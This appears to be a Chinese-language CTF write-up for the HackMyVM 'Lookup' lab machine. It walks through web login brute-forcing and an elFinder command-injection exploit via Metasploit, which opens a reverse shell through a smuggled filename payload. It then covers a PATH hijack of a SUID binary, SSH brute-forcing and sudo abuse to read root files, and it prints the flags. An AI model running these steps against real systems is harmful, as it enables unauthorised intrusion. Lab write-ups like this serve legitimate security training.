---
title: HackMyVM-Lookup
published: 2025-03-09 16:23:40
tags: [HackMyVM]
category: 靶机
draft: false
---

# Lookup.

> https://hackmyvm.eu/machines/machine.php?vm=Lookup
> 

Notes: **Enjoy it.**

## 前期踩点

```python
⚡ root@kali  ~/Desktop/test/test  nmap -sP 192.168.56.0/24                      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-21 03:21 EST
Nmap scan report for 192.168.56.1
Host is up (0.00069s latency).
MAC Address: 0A:00:27:00:00:09 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00044s latency).
MAC Address: 08:00:27:D5:61:82 (Oracle VirtualBox virtual NIC)
Nmap scan report for www.smol.hmv (192.168.56.16)
Host is up (0.00051s latency).
MAC Address: 08:00:27:E7:07:A1 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.4
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 15.08 seconds
```

```python
⚡ root@kali  ~/Desktop/test/test  nmap -sT -min-rate 10000 -p- 192.168.56.16                          
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-21 03:26 EST
Nmap scan report for www.smol.hmv (192.168.56.16)
Host is up (0.00051s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:E7:07:A1 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 4.14 seconds
```

```python
⚡ root@kali  ~/Desktop/test/test  nmap -sT -A -T4 -O -p 22,80 192.168.56.16 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-21 03:26 EST
Nmap scan report for www.smol.hmv (192.168.56.16)
Host is up (0.00053s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://lookup.hmv
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 08:00:27:E7:07:A1 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.53 ms www.smol.hmv (192.168.56.16)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.37 seconds
```

访问`HTTP`服务，并收集指纹

![image.png](image%20118.png)

## Brute

尝试了`SQL`注入等常规操作后无结果

尝试了用户`admin`，爆破密码，最后`password123`的数据包和别的数据包返回不一样

![image.png](image%20119.png)

![image.png](image%20120.png)

那么密码应该是对的，现在继续爆破用户名

![image.png](image%20121.png)

得到用户名密码`jose:password123` ,登陆后跳转到`files.lookup.hmv` ，将其添加到`hosts`文件

## 后台利用

登陆进去后，是一个文件管理的系统`elFinder`

![image.png](image%20122.png)

![image.png](image%20123.png)

搜索漏洞，刚好靶机的版本存在远程命令执行漏洞

![image.png](image%20124.png)

`MSF`搜索，并利用

```python
msf6 > search elFinder
                                                         
Matching Modules                                
================                                                                                                  
                                                         
   #  Name                                                               Disclosure Date  Rank       Check  Description
   -  ----                                                               ---------------  ----       -----  -----------
   0  exploit/multi/http/builderengine_upload_exec                       2016-09-18       excellent  Yes    BuilderEngine Arbitrary File Upload Vulnerability and execution
   1  exploit/unix/webapp/tikiwiki_upload_exec                           2016-07-11       excellent  Yes    Tiki Wiki Unauthenticated File Upload Vulnerability
   2  exploit/multi/http/wp_file_manager_rce                             2020-09-09       normal     Yes    WordPress File Manager Unauthenticated Remote Code Execution
   3  exploit/linux/http/elfinder_archive_cmd_injection                  2021-06-13       excellent  Yes    elFinder Archive Command Injection
   4  exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection  2019-02-26       excellent  Yes    elFinder PHP Connector exiftran Command Injection

Interact with a module by name or index. For example info 4, use 4 or use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection

msf6 > use 4
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > options

Module options (exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /elFinder/       yes       The base path to elFinder
   VHOST                       no        HTTP server virtual host

Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.56.4     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Auto

View the full module info with the info, or info -d command.

msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > set rhosts 192.168.56.16
rhosts => 192.168.56.16  
msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > set vhost files.lookup.hmv
vhost => files.lookup.hmv    
msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > run

[*] Started reverse TCP handler on 192.168.56.4:4444 
[*] Uploading payload 'adB6JwtTYi.jpg;echo 6370202e2e2f66696c65732f616442364a77745459692e6a70672a6563686f2a202e5a5258637867743064302e706870 |xxd -r -p |sh& #.jpg' (1953 bytes)
[*] Triggering vulnerability via image rotation ...
[*] Executing payload (/elFinder/php/.ZRXcxgt0d0.php) ...
[*] Sending stage (40004 bytes) to 192.168.56.16
[+] Deleted .ZRXcxgt0d0.php
[*] Meterpreter session 1 opened (192.168.56.4:4444 -> 192.168.56.16:39778) at 2025-02-21 04:45:57 -0500
[*] No reply
[*] Removing uploaded file ...
[+] Deleted uploaded file

meterpreter >                                                                                                    
```

## 提权 - think

先信息收集一波

```python
$ uname -a
Linux lookup 5.4.0-156-generic #173-Ubuntu SMP Tue Jul 11 07:25:22 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux

$ ip add
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: enp0s17: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:e7:07:a1 brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.16/24 brd 192.168.56.255 scope global dynamic enp0s17
       valid_lft 456sec preferred_lft 456sec
    inet6 fe80::a00:27ff:fee7:7a1/64 scope link 
       valid_lft forever preferred_lft forever
       
 $ find / -perm -u=s -type f 2>/dev/null
/snap/snapd/19457/usr/lib/snapd/snap-confine
/snap/core20/1950/usr/bin/chfn
/snap/core20/1950/usr/bin/chsh
/snap/core20/1950/usr/bin/gpasswd
/snap/core20/1950/usr/bin/mount
/snap/core20/1950/usr/bin/newgrp
/snap/core20/1950/usr/bin/passwd
/snap/core20/1950/usr/bin/su
/snap/core20/1950/usr/bin/sudo
/snap/core20/1950/usr/bin/umount
/snap/core20/1950/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1950/usr/lib/openssh/ssh-keysign
/snap/core20/1974/usr/bin/chfn
/snap/core20/1974/usr/bin/chsh
/snap/core20/1974/usr/bin/gpasswd
/snap/core20/1974/usr/bin/mount
/snap/core20/1974/usr/bin/newgrp
/snap/core20/1974/usr/bin/passwd
/snap/core20/1974/usr/bin/su
/snap/core20/1974/usr/bin/sudo
/snap/core20/1974/usr/bin/umount
/snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1974/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pwm
/usr/bin/at
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/umount
```

看见一个没见过的`pwm` ，执行看看，好像是要找到`.passwords`文件，但是该用户没有家目录

```python
$ pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
```

查看权限

```python
$ ls -al /usr/sbin/pwm
-rwsr-sr-x 1 root root 17176 Jan 11  2024 /usr/sbin/pwm
```

将文件拉取到靶机

![image.png](image%20125.png)

`IDA`分析

```python
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char v4; // [rsp+Fh] [rbp-131h]
  FILE *stream; // [rsp+10h] [rbp-130h]
  FILE *v6; // [rsp+18h] [rbp-128h]
  char v7[64]; // [rsp+20h] [rbp-120h] BYREF
  char s[112]; // [rsp+60h] [rbp-E0h] BYREF
  char filename[104]; // [rsp+D0h] [rbp-70h] BYREF
  unsigned __int64 v10; // [rsp+138h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  puts("[!] Running 'id' command to extract the username and user ID (UID)");
  snprintf(s, 0x64uLL, "id");
  stream = popen(s, "r");
  if ( stream )
  {
    if ( (unsigned int)__isoc99_fscanf(stream, "uid=%*u(%[^)])", v7) == 1 )
    {
      printf("[!] ID: %s\n", v7);
      pclose(stream);
      snprintf(filename, 0x64uLL, "/home/%s/.passwords", v7);
      v6 = fopen(filename, "r");
      if ( v6 )
      {
        while ( 1 )
        {
          v4 = fgetc(v6);
          if ( v4 == -1 )
            break;
          putchar(v4);
        }
        fclose(v6);
        return 0;
      }
      else
      {
        printf("[-] File /home/%s/.passwords not found\n", v7);
        return 0;
      }
    }
    else
    {
      perror("[-] Error reading username from id command\n");
      return 1;
    }
  }
  else
  {
    perror("[-] Error executing id command\n");
    return 1;
  }
	}
```

`stream = popen(s, "r");` 使用 `popen` 函数执行 `id` 命令，并返回一个 `FILE *` 指针，表示命令的标准输出流

但是`id`并没有使用绝对路径，我们可以劫持

```python
$ echo "#!/bin/bash" > id
$ echo "echo 'uid=1000(think) gid=1000(think) groups=1000(think)'" >> id
$ cat id
#!/bin/bash
echo 'uid=1000(think) gid=1000(think) groups=1000(think)'
$ export PATH="/tmp:$PATH"
$ chmod +x id
```

劫持后是一字典

```python
$ pwm                                     
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
jose1006
jose1004
jose1002
jose1001teles
jose100190
jose10001
jose10.asd
jose10+
jose0_07
jose0990
jose0986$
jose098130443
jose0981
jose0924
jose0923
jose0921
thepassword
jose(1993)
jose'sbabygurl
jose&vane
jose&takie
jose&samantha
jose&pam
jose&jlo
jose&jessica
jose&jessi
josemario.AKA(think)
jose.medina.
jose.mar
jose.luis.24.oct
jose.line
jose.leonardo100
jose.leas.30
jose.ivan
jose.i22
jose.hm
jose.hater
jose.fa
jose.f
jose.dont
jose.d
jose.com}
jose.com
jose.chepe_06
jose.a91
jose.a
jose.96.
jose.9298
jose.2856171                 
```

拿到字典后保存为`pass.txt`开始爆破`SSH`

```python
 ⚡ root@kali  ~/Desktop/test/lookup  hydra -l think -P pass.txt -Vv  192.168.56.16 -t 16 ssh
 [22][ssh] host: 192.168.56.16   login: think   password: josemario.AKA(think)
```

得到密码`josemario.AKA(think)`

## 提权 - root

登录`ssh`

```python
⚡ root@kali  ~/Desktop/test/lookup  ssh think@192.168.56.16            
think@192.168.56.16's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 21 Feb 2025 06:16:13 PM UTC

  System load:  0.0               Processes:                201
  Usage of /:   60.4% of 9.75GB   Users logged in:          0
  Memory usage: 39%               IPv4 address for enp0s17: 192.168.56.16
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

7 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Jan 11 20:17:32 2024 from 192.168.1.13
think@lookup:~$ 
```

当前目录读取到`UserFlag`

```python
think@lookup:~$ cat user.txt 
38375fb4dd8baa2b2039ac03d92b820e
```

查看权限

```python
think@lookup:~$ sudo -l
[sudo] password for think: 
Matching Defaults entries for think on lookup:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User think may run the following commands on lookup:
    (ALL) /usr/bin/look
```

直接读取RootFlag

```python
think@lookup:~$ sudo look '' /root/root.txt
5a285a9f257e45c68bb6c9f9f57d18e8
```